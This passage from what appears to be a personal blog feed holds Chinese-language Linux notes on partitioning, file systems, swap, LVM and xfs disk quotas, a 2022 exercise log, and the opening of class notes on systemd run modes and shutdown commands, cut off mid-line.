        <content type="html"><![CDATA[<p><img src="/images/%E5%BD%B1%E8%A7%86%E5%89%A7%E7%85%A7/%E9%9B%84%E5%B8%88%E5%B0%91%E5%B9%B47.jpg"></p><h1 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h1><p>硬盘接口是硬盘与主机系统间的连接部件，作用是在硬盘缓存和主机内存之间传输数据。</p><p>硬盘接口分为：IDE、SATA、SCSI、SAS、光纤通道</p><p>磁盘在linux系统中的表示：</p><ul><li>&#x2F;dev&#x2F;fd[0-1]#软盘驱动器</li><li>&#x2F;dev&#x2F;sr0或&#x2F;dev&#x2F;cdrom(后者是前者的软链接)#光盘CD&#x2F;DVD ROM</li><li>&#x2F;dev&#x2F;hdXY#IDE硬盘</li><li>&#x2F;dev&#x2F;sdXY#SATA&#x2F;SCSI&#x2F;SAS&#x2F;USB硬盘&#x2F;U盘</li><li>&#x2F;dev&#x2F;md0#第一个磁盘阵列设备</li><li>&#x2F;dev&#x2F;sr0#第一个SCSI磁带设备</li></ul><h2 id="磁盘分区"><a href="#磁盘分区" class="headerlink" title="磁盘分区"></a>磁盘分区</h2><h3 id="MBR分区"><a href="#MBR分区" class="headerlink" title="MBR分区"></a>MBR分区</h3><p>是传统的分区机制，使用BIOS引导的PC设备</p><p>分类：主分区（primary）+【扩展分区extended  逻辑分区logical】</p><p>支持的分区数量：4个主分区或三个主分区+1个扩展分区（逻辑分区：IDE接口的最多63个；SCSI接口的最多15个）</p><h3 id="GPT分区"><a href="#GPT分区" class="headerlink" title="GPT分区"></a>GPT分区</h3><p>GUID Partition Table,全局唯一标识分区表</p><p>优点：</p><ul><li><p>在默认情况下，GPT最多可支持128个分区。</p></li><li><p>支持大于2.2TB的总容量及大于2.2TB分区，最大支持18EB(1EB&#x3D;1024PB,1PB&#x3D;1024TB,1TB&#x3D;1024GB)</p></li><li><p>GPT分区表自带备份</p></li><li><p>向后兼容MBR.GPT分区表上包含保护性的MBR区域。</p></li></ul><h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><p>文件系统——操作系统中负责管理和存储文件信息的软件系统称为文件管理系统，简称文件系统。</p><p>linux常用文件系统</p><p>xfs：一种扩展性强、高性能的全64位日志文件系统，也是RHEL7默认的文件系统，可以支持上百万太字节的存储空间。</p><p>ext4：一种针对ext3系统的扩展日志式文件系统，是专门为Linux开发的原始的扩展文件系统，支持文件的连续写入，减少文件碎片，提高磁盘的读写性能。</p><p>swap：使用交换分区来提供虚拟内存，大小一般是物理内存的2倍，由操作系统自行管理。</p><p>RAMFS：内存文件系统，速度很快</p><p>iso9660：大部分光盘所采用的文件系统。</p><p>NFS：网络文件系统，主要用于远程文件共享</p><p>NTFS：windows操作系统采用的文件系统</p><p>……….</p><h2 id="挂载与逻辑卷"><a href="#挂载与逻辑卷" class="headerlink" title="挂载与逻辑卷"></a>挂载与逻辑卷</h2><p>所谓“挂载”就是把一个目录当成进入点，将磁盘分区的数据放置在该目录下，从而通过该目录访问分区中的数据，那个点被称为“挂载点”。</p><h3 id="Linux逻辑卷（LVM）"><a href="#Linux逻辑卷（LVM）" class="headerlink" title="Linux逻辑卷（LVM）"></a>Linux逻辑卷（LVM）</h3><p>在LVM中，舍弃了传统的以“分区”为磁盘的管理单元，改为“卷”为其管理单元，其思想是：物理磁盘空间分解——物理卷——汇聚卷组——转化——逻辑卷，逻辑卷空间可以来自多个物理磁盘，更为重要的是逻辑卷的空间大小能够保持现有数据不变的情况下进行动态调整。</p><p><img src="/images/linux%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/%E7%A3%81%E7%9B%981.jpg"></p><h1 id="配置详情"><a href="#配置详情" class="headerlink" title="配置详情"></a>配置详情</h1><h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><p>df -T&#x2F;&#x2F;只可以查看已经挂载的分区和文件系统</p><p>parted -l&#x2F;&#x2F;列出所有设备的分区信息</p><p>blkid&#x2F;&#x2F;输出分区或分区类型</p><p>lsblk -f&#x2F;&#x2F;查看所有设备的文件系统类型</p><p>partprobe 【设备名】&#x2F;&#x2F;获取新的分区表</p><p>mount -a&#x2F;&#x2F;重新读取&#x2F;etc&#x2F;fstab文件</p><h3 id="fdisk管理MBR分区"><a href="#fdisk管理MBR分区" class="headerlink" title="fdisk管理MBR分区"></a>fdisk管理MBR分区</h3><p>创建分区</p><p>​命令：fdisk 设备名</p><p>指令：</p><p><img src="/images/linux%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/%E7%A3%81%E7%9B%982.jpg"></p><h3 id="gdisk管理GPT分区"><a href="#gdisk管理GPT分区" class="headerlink" title="gdisk管理GPT分区"></a>gdisk管理GPT分区</h3><p>创建分区</p><p>​命令：gdisk 设备名</p><p>指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">b 将GPT数据备份到一个文件</span><br><span class="line">c 更改分区名称</span><br><span class="line">d 删除一个分区</span><br><span class="line">i 显示分区详细信息</span><br><span class="line">l 列出已知分区类型。此处8200是Linux swap，8300是Linux filesystem（对应fdisk的82和83）。还有一个8e00是Linux LVM</span><br><span class="line">n 增加一个新的分区</span><br><span class="line">o 创建一个新的空白的GPT分区表</span><br><span class="line">p 显示当前磁盘的分区表</span><br><span class="line">q 退出gdisk程序，不保存任何修改</span><br><span class="line">r 恢复和转换选项（仅限专家）</span><br><span class="line">s 排序分区</span><br><span class="line">t 改变分区的类型</span><br><span class="line">v 验证磁盘分区表</span><br><span class="line">w 将分区表写入裁判并退出（保存并退出）</span><br><span class="line">x 额外功能（仅限专家）</span><br><span class="line">? 显示帮助信息</span><br></pre></td></tr></table></figure><h3 id="文件系统格式化分区"><a href="#文件系统格式化分区" class="headerlink" title="文件系统格式化分区"></a>文件系统格式化分区</h3><p>定义：</p><p>磁盘分区后，也就是分区上创建所需要的文件系统。对硬盘分区格式化会“冲掉”分区内原有数据，不可恢复。</p><p>格式：</p><p>mkfs|mkfs.xfs|mkfs.ext4 [选项] 分区的设备名</p><p>常用选项：</p><ul><li>-t #文件系统类型，当命令为mkfs时，指定创建格式，mkfs.xfs则不需要该选项。</li><li>-c #建立文件系统前先检查坏块</li><li>-V #输出建立文件系统的详细信息</li><li>-f  #mkfs.xfs加上选项f强行格式化</li></ul><p>例如：mkfs -t xfs &#x2F;dev&#x2F;sdb5 或mkfs.xfs &#x2F;dev&#x2F;sdb5</p><h3 id="挂载与卸载"><a href="#挂载与卸载" class="headerlink" title="挂载与卸载"></a>挂载与卸载</h3><h4 id="手动挂载分区"><a href="#手动挂载分区" class="headerlink" title="手动挂载分区"></a>手动挂载分区</h4><p>​格式：</p><p>mount [-t 文件系统类型] 设备名  挂载点目录</p><h4 id="自动挂载分区"><a href="#自动挂载分区" class="headerlink" title="自动挂载分区"></a>自动挂载分区</h4><p>手动挂载分区会在系统重启后失效，若要永久挂载分区，则需要通过编辑<code>/etc/fstab</code>文件来实现。</p><p>在”&#x2F;etc&#x2F;fstab”文件中每一行记录对应一个分区或设备的挂载配置信息，从左到右六个字段（使用空格分隔）</p><p>第一个字符：要挂在的设备如&#x2F;dev&#x2F;sdb5</p><p>第二个字符：文件系统的挂载点目录的位置</p><p>第三个字符：文件系统的类型，如xfs、swap等</p><p>第四个字符：挂载参数</p><p>如：defaults\ro\rw\suid…………</p><p>第五个字符：表示是否需要dump的备份功能的标志位，0表示不需要，1表示需要。</p><p>第六个字符：设定开机时检查的动作，0表示不进行检查，1表示优先检查，2表示其次检查</p><p>例：</p><p><code>/dev/sdb1/datexfs defaults 00</code></p><p>mount -a#重新读取&#x2F;etc&#x2F;fstab文件</p><h4 id="卸载分区"><a href="#卸载分区" class="headerlink" title="卸载分区"></a>卸载分区</h4><p>​格式：</p><p>umout 【挂载点目录或存储设备名】</p><h3 id="交换分区管理"><a href="#交换分区管理" class="headerlink" title="交换分区管理"></a>交换分区管理</h3><p><strong>swap</strong>交换分区类似于windows系统中的“虚拟内存”，当程序被调入内存，但是该程序又不常被CPU所取用时，这些不常被使用的程序会被放到硬盘的swap交换分区当中，而将速度较快的内存空间释放给真正需要的程序使用，以避免因为物理内存不足造成系统效能低的问题。如果系统没有swap交换分区或不够用时，可扩展swap交换分区。</p><p>扩展swap分区有两种：</p><ul><li>以磁盘分区的方式扩展</li><li>以镜像文件方式扩展</li></ul><h4 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h4><p>partprobe &#x2F;dev&#x2F;sdb1#重新读取分区表</p><p>mkswap &#x2F;dev&#x2F;sdb1#格式化交换分区</p><p>free -m#显示扩展前已启用的交换分区的大小</p><p>swapon [参数 ]</p><p>swapon &#x2F;dev&#x2F;sdb1#启动新添加的交换分区&#x2F;dev&#x2F;sdb1</p><h4 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h4><ul><li>​-a将&#x2F;etc&#x2F;fstab文件中所有设置为swap的设备，启动为交换区</li><li>​-h显示帮助</li><li>​-p指定交换区的优先顺序</li><li>​-s显示交换区使用情况</li></ul><h4 id="永久挂载"><a href="#永久挂载" class="headerlink" title="永久挂载"></a>永久挂载</h4><p>blkid &#x2F;dev&#x2F;sdb1#查看新添加交换分区的UUID</p><p>永久挂载，在&#x2F;etc&#x2F;fstab文件末尾添加以下一行</p><p><code>uuid=031111............swap swap defaults 0 0</code></p><h3 id="动态磁盘管理"><a href="#动态磁盘管理" class="headerlink" title="动态磁盘管理"></a>动态磁盘管理</h3><h4 id="创建与使用逻辑卷"><a href="#创建与使用逻辑卷" class="headerlink" title="创建与使用逻辑卷"></a>创建与使用逻辑卷</h4><p>LVM逻辑卷创建的主要过程是：</p><p>物理磁盘分区➡️物理卷➡️卷组➡️逻辑卷➡️格式化逻辑卷➡️挂载逻辑卷到目录➡️设置开机自动挂载</p><p>查看系统中是否安装lvm2工具，默认已安装。</p><p><code>[root@Jw2031-122 ~]# rpm -q lvm2</code><br><code>lvm2-2.02.105-14.el7.x86_64</code></p><p>创建查看是否lvm类型分区（分区型号为8e）</p><p>以下为转成完成的分区System一栏显示Linux LVM</p><p><code>fdisk /dev/sdb</code></p><p>  设备 Boot           Start         End            Blocks   Id  System</p><p>&#x2F;dev&#x2F;sdb1…………………..</p><p>&#x2F;dev&#x2F;sdb2          104448      309247      102400   8e  <strong>Linux LVM</strong></p><p>&#x2F;dev&#x2F;sdb3……………………………..</p><p><font color=green face="黑体" size=5>例:</font></p><p>物理卷⤵️</p><p>将&#x2F;dev&#x2F;sdb2、&#x2F;dev&#x2F;sdb5、&#x2F;dev&#x2F;sdc1三个Linux分区转换为物理卷使用pvs或pvscan命令查看当前系统中已建立的物理卷。</p><p><code>[root@Jw2031-122 ~]# pvcreate /dev/sdb2 /dev/sdb5 /dev/sdc1</code></p><p><code>[root@Jw2031-122 ~]# pvs</code><br>  <code>PV         VG   Fmt  Attr PSize   PFree</code><br>  <code>/dev/sda2  rhel lvm2 a--   19.51g      0</code><br>  <code>/dev/sdb2       lvm2 a--  100.00m 100.00m</code><br>  <code>/dev/sdb5       lvm2 a--  600.00m 600.00m</code><br>  <code>/dev/sdc1       lvm2 a--  500.00m 500.00m</code><br><code>[root@Jw2031-122 ~]#</code></p><p>卷组⤵️</p><p>将&#x2F;dev&#x2F;sdb2、&#x2F;dev&#x2F;sdb5整合，创建名为vg01的卷组➡️使用vgs命令扫描当前系统中已创建的卷组➡️使用vgdisplay命令查看卷组vg01的详细信息</p><p><code>[root@Jw2031-122 ~]# vgcreate vg01 /dev/sdb2 /dev/sdb5</code><br>  <code>Volume group &quot;vg01&quot; successfully created</code><br><code>[root@Jw2031-122 ~]# vgs</code><br>  <code>VG   #PV #LV #SN Attr   VSize   VFree</code><br>  <code>rhel   1   2   0 wz--n-  19.51g      0</code><br>  <code>vg01   2   0   0 wz--n- 692.00m 692.00m</code><br><code>[root@Jw2031-122 ~]# vgdisplay vg01//查看卷组vg01的详情</code></p><p>逻辑卷⤵️</p><p>在卷组vg01上创建一个名为“lv01”的逻辑卷，容量为500MB</p><p><code>[root@Jw2031-122 ~]# lvcreate -n lv01 -L 500MB vg01</code><br>  <code>Logical volume &quot;lv01&quot; created</code></p><p><code>[root@Jw2031-122 ~]# lvs#查看逻辑卷</code><br>  <code>LV   VG   Attr       LSize   Pool Origin Data%  Move Log Cpy%Sync Convert</code><br>  <code>root rhel -wi-ao----  17.51g</code><br>  <code>swap rhel -wi-ao----   2.00g</code><br>  <code>lv01 vg01 -wi-a----- 500.00m</code></p><p>格式化逻辑卷⤵️</p><p><code>[root@Jw2031-122 ~]# mkfs -t xfs /dev/vg01/lv01</code></p><h4 id="管理与调整卷"><a href="#管理与调整卷" class="headerlink" title="管理与调整卷"></a>管理与调整卷</h4><h5 id="扩展卷组"><a href="#扩展卷组" class="headerlink" title="扩展卷组"></a>扩展卷组</h5><p>根据前面的操作，卷组vg01中包含了&#x2F;dev&#x2F;sdb1、&#x2F;dev&#x2F;sdb2两个物理卷，现添加&#x2F;dev&#x2F;sdc1</p><p><code>[root@localhost ~]# vgextend vg01 /dev/sdc1 #将物理卷/dev/sdc1添加到卷组vg01</code><br>  <code>Volume group &quot;vg01&quot; successfully extended</code><br><code>[root@localhost ~]#</code><br><code>[root@localhost ~]# vgs vg01#显示扩展后卷组vg01容量</code><br>  <code>VG   #PV #LV #SN Attr   VSize  VFree</code><br>  <code>vg01   3   1   0 wz--n- &lt;9.99g &lt;8.99g</code><br><code>[root@localhost ~]#</code></p><h5 id="扩展逻辑卷"><a href="#扩展逻辑卷" class="headerlink" title="扩展逻辑卷"></a>扩展逻辑卷</h5><p>当逻辑卷不够用且卷组中还有剩余空间时，可以在线扩展逻辑卷的容量。扩展过程为：</p><p><code>[root@localhost ~]# lvextend -L +1G /dev/vg01/lv01  #将逻辑卷lv01容量添加1GB</code><br>  <code>Size of logical volume vg01/lv01 changed from 1.00 GiB (256 extents) to 2.00 GiB (512 extents).</code><br>  <code>Logical volume vg01/lv01 successfully resized.</code><br><code>[root@localhost ~]# lvs /dev/vg01/lv01  #查看扩容后逻辑卷容量</code><br>  <code>LV   VG   Attr       LSize Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert</code><br>  <code>lv01 vg01 -wi-ao---- 2.00g</code></p><p><code>[root@localhost ~]#</code></p><p>扩容成功后，用df -Th查看逻辑卷的大小还是原先的，说明扩容后还未被挂载点上的文件系统识别。</p><ul><li><p>对于xfs格式的文件系统，可使用“xfs_growfs”命令在不需离线（卸载逻辑卷）的情况下将扩展后的逻辑卷扩展到挂载点上。</p></li><li><p>对于ext2&#x2F;3&#x2F;4格式的文件，可使用“resize2fs”命令扩展后的逻辑卷扩展到挂载点上</p></li></ul><h5 id="缩小逻辑卷"><a href="#缩小逻辑卷" class="headerlink" title="缩小逻辑卷"></a>缩小逻辑卷</h5><p>对于ext2&#x2F;3&#x2F;4格式的文件系统，不仅可以扩展空间，还可以在离线状态下（卸载逻辑卷）缩小空间。xfs文件系统只能扩展不能缩小空间</p><p>例：将现有的2G逻辑卷lv01卸载后转换为ext4格式，缩小1G</p><p><code>[root@localhost ~]# umount /dev/vg01/lv01#卸载逻辑卷</code><br><code>[root@localhost ~]# mkfs -t ext4 /dev/vg01/lv01#以ext4文件系统格式逻辑卷</code></p><p><code>[root@jw2031-122 ~]# e2fsck -f /dev/vg01/lv01#强制检查并修复逻辑卷</code></p><p><code>[root@localhost ~]# resize2fs /dev/vg01/lv01 1G#重新定义文件系统的大小为1G</code></p><p><code>[root@jw2031-122 ~]# lvreduce -L -1G /dev/vg01/lv01#将逻辑卷lv01空间缩小1G</code></p><h5 id="缩小卷组"><a href="#缩小卷组" class="headerlink" title="缩小卷组"></a>缩小卷组</h5><p>例</p><p><code>pvmove /dev/sdb6 /dev/sdc1#将/dev/sdb6上的数据迁移到/dev/sdc1</code></p><p><code>vgreduce vg01 /dev/sdb6#将物理卷/dev/sdb6从卷组vg01中移除</code></p><h5 id="删除逻辑卷"><a href="#删除逻辑卷" class="headerlink" title="删除逻辑卷"></a>删除逻辑卷</h5><p>例</p><p><code>lvremove /dev/vg01/lv01#删除逻辑卷</code></p><h5 id="删除卷组"><a href="#删除卷组" class="headerlink" title="删除卷组"></a>删除卷组</h5><p><code>vgremove vg01#删除卷组vg01</code></p><p><code>vgs vg01#查看卷组</code></p><h3 id="磁盘配额管理"><a href="#磁盘配额管理" class="headerlink" title="磁盘配额管理"></a>磁盘配额管理</h3><p>xfs_quota命令管理xfs文件系统磁盘配额</p><p>quota命令管理ext4文件系统磁盘配额</p><p><font color=green face="黑体" size=5>例:</font></p><p>🙄🙄创建&#x2F;dev&#x2F;sdb5分区和&#x2F;data目录挂载点为例对用户zhang3设置磁盘软限制为100MB、磁盘硬限制为120MB、文件数软限制为3个、文件数硬限制为6个。</p><p><strong>步骤1</strong>：检查系统中是否安装xfs_quota命令</p><p><code>[root@jw2031-122 ~]# rpm -qf which xfs_quota</code><br><code>xfsprogs-3.2.0-0.10.alpha2.el7.x86_64</code></p><p><strong>步骤2</strong>：创建被限制使用磁盘空间大小的用户和密码，创建用户存放文件目录并将该目录所有权限给该用户，保证用户能读写目录中的文件。</p><p><code>[root@jw2031-122 ~]# useradd zhang3</code><br><code>[root@jw2031-122 ~]# passwd zhang3</code><br><code>更改用户 zhang3 的密码 。</code><br><code>新的 密码：</code><br><code>无效的密码： 密码少于 7 个字符</code><br><code>重新输入新的 密码：</code><br><code>passwd：所有的身份验证令牌已经成功更新。</code><br><code>[root@jw2031-122 ~]# mkdir /data/</code><br><code>[root@jw2031-122 ~]# chown zhang3 /data/  #将目录所有权限赋给用户</code><br><code>[root@jw2031-122 ~]# ll -d /data</code><br><code>drwxr-xr-x. 2 zhang3 root 6 4月   4 15:24 /data</code><br><strong>步骤3</strong>：支持配额挂载磁盘分区到指定目录</p><p><font size=2 face="楷体" color=red>若只限制用户账号而不限制组账号，使用“-o usrquota”选项挂载分区，若事先已挂载则需先卸载</font></p><p><code>[root@jw2031-122 ~]# mount -o usrquota,grpquota /dev/sdb5 /data</code><br><code>[root@jw2031-122 ~]# mount |grep sdb5</code><br><code>/dev/sdb5 on /data type xfs (rw,relatime,seclabel,attr2,inode64,usrquota,grpquota)</code><br><code>[root@jw2031-122 ~]#</code></p><p><strong>步骤4：</strong>设置系统启动时以支持配额方式挂载磁盘分区</p><p>&#x2F;etc&#x2F;fstab下添加⤵</p><p><code>/dev/sdb5       /data   xfs     defaults,usrquota,grpquota      0 0</code></p><p><strong>步骤5：</strong>为zhang3用户和&#x2F;data目录设置磁盘配额并查看</p><p>xfs_quota格式说明⤵</p><p><code>xfs_quota -x -c &#39;子命令&#39; 挂载目录</code></p><p>参数⤵</p><ul><li><p>-x#使用专家模式，只有此模式才能设置配额</p></li><li><p>-c ‘子命令’#以交换式或参数的形式设置要执行的命令，常用子命令如下</p></li><li><p>report#显示配额信息</p><ul><li><p>limit#设置配额</p></li><li><p>disable|enable#暂时关闭或启动磁盘配额限制</p></li><li><p>off#完全关闭磁盘配额限制，此时，无法用enable重启配额限制，只能通过卸载后再重新挂载才可恢复配额限制功能</p></li></ul></li></ul><p><code>[root@jw2031-122 ~]# xfs_quota -x -c &#39;limit bsoft=100M bhard=120M isoft=3 ihard=6 -u zhang3&#39; /data</code><br><code>[root@jw2031-122 ~]# xfs_quota -x -c &#39;report -ubih&#39; /data</code><br><code>User quota on /data (/dev/sdb5)</code><br>                        <code>Blocks                            Inodes</code><br><code>User ID      Used   Soft   Hard Warn/Grace     Used   Soft   Hard Warn/Grace</code></p><p><code>root            0      0      0  00 [------]      3      0      0  00 [------]zhang3          0   100M   120M  00 [------]      0      3      6  00 [------]</code></p><p><strong>步骤6：</strong>test!!！切换到zhang3用户，验证磁盘配额限制是否生效</p><p><code>[root@jw2031-122 data]# su zhang3</code></p><p><code>//下面dd命令是向文件/data/test写入90MB数据，以便验证配额情况</code></p><p><code>[zhang3@jw2031-122 data]$ dd if=/dev/zero of=/data/test bs=1M count=90 记录了90+0 的读入 记录了90+0 的写出 94371840字节(94 MB)已复制，0.164795 秒，573 MB/秒 [zhang3@jw2031-122 data]$</code></p><p><code>[zhang3@jw2031-122 data]$ dd if=/dev/zero of=/data/test bs=1M count=110 记录了110+0 的读入 记录了110+0 的写出#超出软限制但未超出硬限制时仍能成功写入 115343360字节(115 MB)已复制，0.0856177 秒，1.3 GB/秒 [zhang3@jw2031-122 data]$</code></p><p><code>[zhang3@jw2031-122 data]$ dd if=/dev/zero of=/data/test bs=1M count=130 dd: 写入&quot;/data/test&quot; 出错: 超出磁盘限额 记录了121+0 的读入 记录了120+0 的写出#写入过程中超出硬限制时被中断，只写入部分内容 125829120字节(126 MB)已复制，0.0643362 秒，2.0 GB/秒 [zhang3@jw2031-122 data]$</code></p><p><strong>步骤7：</strong>在root用户与zhang3用户之间切换，关闭或启用磁盘配额限制</p><p><code>[root@jw2031-122 data]# xfs_quota -x -c &#39;disable&#39; /data#临时关闭磁盘配额限制</code><br><code>[root@jw2031-122 data]# su zhang3</code><br><code>[zhang3@jw2031-122 data]  dd if=/dev/zero of=/data/test bs=1M count=130</code><br><code>记录了130+0 的读入</code><br><code>记录了130+0 的写出</code><br><code>136314880字节(136 MB)已复制，0.0763736 秒，1.8 GB/秒#在配额关闭时超额存储成功</code><br><code>[zhang3@jw2031-122 data] su root</code><br><code>密码：</code><br><code>[root@jw2031-122 data]# xfs_quota -x -c &#39;enable&#39; /data#重启磁盘配额限制</code><br><code>[root@jw2031-122 data]# su zhang3</code><br><code>[zhang3@jw2031-122 data] dd if=/dev/zero of=/data/test bs=1M count=130</code><br><code>dd: 写入&quot;/data/test&quot; 出错: 超出磁盘限额</code><br><code>记录了121+0 的读入</code><br><code>记录了120+0 的写出</code><br><code>125829120字节(126 MB)已复制，0.0836222 秒，1.5 GB/秒</code><br><code>[zhang3@jw2031-122 data]$ su</code><br><code>密码：</code><br><code>[root@jw2031-122 data]# xfs_quota -x -c &#39;off&#39; /data#完全关闭磁盘配额功能</code><br><code>[root@jw2031-122 data]# xfs_quota -x -c &#39;enable&#39; /data</code><br><code>XFS_QUOTAON: 无效的参数#完全关闭配额后无法用enable重启配额</code><br><code>[root@jw2031-122 data]# umount /data;mount -a#完全关闭配额后只有卸载后重新挂载方能恢复</code></p>]]></content>
      
      
      <categories>
          
          <category> Linux笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022.运动记录</title>
      <link href="/posts/4165"/>
      <url>/posts/4165</url>
      
        <content type="html"><![CDATA[<br /><p style="text-align:center;color:#9EC044;font-size:1.5em;font-weight: bold;">2022.运动记录​    <div align=center class="aspect-ratio">    <iframe src="https://player.bilibili.com/player.html?aid=421221529&bvid=BV1g3411y7YQ&cid=427494323&high_quality=1&danmaku=0"     scrolling="no"     border="0"     frameborder="no"     framespacing="0"     high_quality=1    danmaku=1     allowfullscreen="true">     </iframe></div><br /><p>目标：健康运动、增强体质、乘风奔跑😏</p><br /><ul><li><span  style="color: #CE0000; ">2022&#x2F;03&#x2F;11开始，记录每一次运动</span>。</li></ul><br /><br /><details><summary>3月</summary><p><b>    <p><b>3月11日5Km</b></p>    <p><b>3月12日5Km</b></p>    <p><b>3月14日6Km</b></p>    <p><b>3月16日5Km</b></p>    <p><b>3月18日2Km</b></p>    <p><b>3月19日5Km</b></p>    <p><b>3月20日3Km</b></p>    <p><b>3月21日3Km</b></p>    <p><b>3月22日 5km</b></p>    <p><b>3月23日800M</b></p>    <p><b>3月25日5km</b></p>    <p><b>3月26日5km</b></p>    <p><b>3月27日2km</b></p>    <p><b>3月28日5.1km</b></p>    <p><b>3月30日4km</b></p></details><details><summary>4月</summary><p><b>    <p><b>4月2日5km</b></p>       <p><b>4月4日5km</b></p>      <p><b>4月5日3km</b></p>       <p><b>4月6日体测1Km</b></p>      <p><b>4月7日打球</b></p>     <p><b>4月9日5km</b></p>     <p><b>4月11日打球</b></p>     <p><b>4月12日打球</b></p>     <p><b>4月13日打球</b></p>     <p><b>4月14日5KM</b></p>     <p><b>4月15日打球</b></p>      <p><b>4月16日5km</b></p>    <p><b>4月17日5km</b></p>    <p><b>4月19日3km</b></p>    <p><b>4月20日5km</b></p>    <p><b>4月22日5km+打球</b></p>    <p><b>4月24日2km</b></p>    <p><b>4月26日5km</b></p>    <p><b>4月27日打球</b></p>    <p><b>4月29日5km</b></p>    <p><b>4月30日打球</b></p></details><details><summary>5月</summary><p><b>    <p><b>5月2日4km</b></p>    <p><b>5月6日1km</b></p>   <p><b>5月9日5km</b></p>    <p><b>5月10日5km</b></p>     <p><b>5月11日打球</b></p>    <p><b>5月13日5km</b></p>    <p><b>5月14日6km</b></p>     <p><b>5月15日5km</b></p>    <p><b>5月17日3km</b></p>     <p><b>5月18日1km</b></p>    <p><b>5月21日8km</b></p>     <p><b>5月24日6km</b></p>     <p><b>5月27日6km</b></p>     <p><b>5月28日6km</b></p>     <p><b>5月30日6km</b></p></details><details><summary>6月</summary><p><b>    <p><b>6月1日3km</b></p>    <p><b>6月4日6km</b></p>    <p><b>6月5日6km</b></p>    <p><b>6月8日3km</b></p>    <p><b>6月14日5km</b></p> </details><details><summary>7月</summary><p><b>    <p><b>7月12日3km</b></p><p><b>7月16日5km</b></p><p><b>7月25日3km</b></p><p><b>7月27日3km</b></p> </details><details><summary>9月</summary><p><b>    <p><b>9月7日5km</b></p>    <p><b>9月27日3km</b></p>    <p><b>9月28日5km</b></p>    <p><b>9月29日5km</b></p>    <p><b>9月30日5km</b></p></details><details><summary>10月</summary><p><b>    <p><b>10月1日5km</b></p>    <p><b>10月2日5km</b></p>    <p><b>10月6日5km</b></p>    <p><b>10月9日5km</b></p>    <p><b>10月11日打球</b></p>    <p><b>10月12日5km</b></p>    <p><b>10月14日5km</b></p>    <p><b>10月15日5km</b></p>        <p><b>10月18日打球</b></p>      <p><b>10月19日打球</b></p>         <p><b>10月21日5km</b></p>    <p><b>10月24日5km</b></p>    <p><b>10月25日打球</b></p>    <p><b>10月27日3km</b></p>    <p><b>10月28日打球</b></p>    <p><b>10月29日5km</b></p></details><details><summary>11月</summary><p><b>    <p><b>11月1日打球</b></p>    <p><b>11月2日5km</b></p>    <p><b>11月4日打球</b></p>    <p><b>11月5日5km</b></p>    <p><b>11月6日5km</b></p>    <p><b>11月7日3km</b></p>    <p><b>11月8日打球</b></p>    <p><b>11月9日打球</b></p>    <p><b>11月16日5km</b></p>    <p><b>11月17日3km</b></p>    <p><b>11月21日3km</b></p>    <p><b>11月23日3km</b></p>        <p><b>11月25日打球</b></p>  </details><details><summary>12月</summary><p><b>    <p><b>12月21日4km</b></p><p><b>12月24日3km</b></p> </details><p>已终结🤫</p><p>​    </p><br /><br /><br />]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux课堂笔记</title>
      <link href="/posts/26143"/>
      <url>/posts/26143</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E5%BD%B1%E8%A7%86%E5%89%A7%E7%85%A7/%E9%9B%84%E5%B8%88%E5%B0%91%E5%B9%B41.jpg"></p><p style="text-align:center;color:#FF00FF;font-size:1.5em;font-weight: bold;">笔记整理<br /><h1 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h1><p>Red hat7.4</p><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>课堂笔记整理</p><h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><p>一些常用小指令</p><h2 id="运行模式"><a href="#运行模式" class="headerlink" title="运行模式"></a>运行模式</h2><p>查看系统当前运行模式：systemctl get-default</p><p>设置系统开机运行模式，重启生效⤵</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl set-default multi-user.target//多用户字符界面模式</span><br><span class="line">systemctl setdefault graphical.target//多用户图形界面模式</span><br><span class="line">systemctl rescue.target //单用户字符界面模式，只有root用户可以登录系统。</span><br></pre></td></tr></table></figure><p>设置运行模式直接生效⤵：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl isolate graphical.target 字符切换到图形界面</span><br><span class="line">systemctl isolate multi-user.target 图形切换到字符</span><br></pre></td></tr></table></figure><p>RHEL7默认有6个虚拟终端，其中：</p><p>不同虚拟终端之前自由切换：Ctrl+ALT+F1~F6；</p><p>查看当前终端：[root@localhost~]# tty</p><p>一行命令多个操作中间用“;”或“|”隔开</p><p>例如：切换到上级目录home,查看空间占有量并创建文件夹cc</p><p>[root@localhost home]# cd ..&#x2F;home;du -sh;mkdir cc</p><p>whoami：显示当前用户</p><h2 id="关机操作"><a href="#关机操作" class="headerlink" title="关机操作"></a>关机操作</h2><p>shutdown语法</p><p><strong>shutdown -r now(立刻重启)</strong> </p><p><strong>shutdown -h now(立刻关机)</strong></p><p>systemctl <strong>reboot(重启系统)</strong></p><p>systemctl <strong>poweroff(退出系统且关闭电源)</strong></p><p>systemctl halt （CPU停止工作但不关闭电源）</p><p><strong>logout(注销)</strong></p><p>systemctl 